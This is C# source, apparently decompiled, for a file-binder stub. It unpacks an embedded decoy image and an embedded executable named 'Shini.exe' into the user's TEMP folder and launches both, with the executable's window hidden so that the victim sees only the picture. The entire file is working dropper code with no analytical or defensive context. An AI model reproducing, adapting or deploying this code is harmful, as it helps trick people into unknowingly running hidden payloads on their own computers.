using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Fjux_binder_Stub;

internal class Program
{
	private static List<Process> Procs = new List<Process>();

	private static void Main(string[] args)
	{
		Console.ReadLine();
		Program program = new Program();
		List<Proccesinfo> list = program.CreateFileInfos();
		foreach (Proccesinfo item in list)
		{
			program.WriteFile(item);
			program.RunFile(item);
		}
		foreach (Process proc in Procs)
		{
			proc.WaitForExit();
		}
	}

	private List<Proccesinfo> CreateFileInfos()
	{
		List<Proccesinfo> list = new List<Proccesinfo>();
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("img4818.jpg");
		byte[] array = new byte[manifestResourceStream.Length];
		manifestResourceStream.Read(array, 0, array.Length);
		manifestResourceStream.Close();
		list.Add(new Proccesinfo(array, "img4818.jpg", waitFor: false, hidden: false, noWindow: false));
		Stream manifestResourceStream2 = Assembly.GetExecutingAssembly().GetManifestResourceStream("Shini.exe");
		byte[] array2 = new byte[manifestResourceStream2.Length];
		manifestResourceStream2.Read(array2, 0, array2.Length);
		manifestResourceStream2.Close();
		list.Add(new Proccesinfo(array2, "Shini.exe", waitFor: false, hidden: true, noWindow: false));
		return list;
	}

	private void WriteFile(Proccesinfo fileInfo)
	{
		FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\" + fileInfo.FileName, FileMode.Create);
		fileStream.Write(fileInfo.FileBytes, 0, fileInfo.FileBytes.Length);
		fileStream.Close();
		fileStream.Dispose();
	}

	private void RunFile(Proccesinfo fileInfo)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		if (fileInfo.NoWindow)
		{
			processStartInfo.CreateNoWindow = true;
		}
		if (fileInfo.Hidden)
		{
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		}
		processStartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + fileInfo.FileName;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
		Procs.Add(process);
		if (fileInfo.WaitFor)
		{
			process.WaitForExit();
		}
	}
}
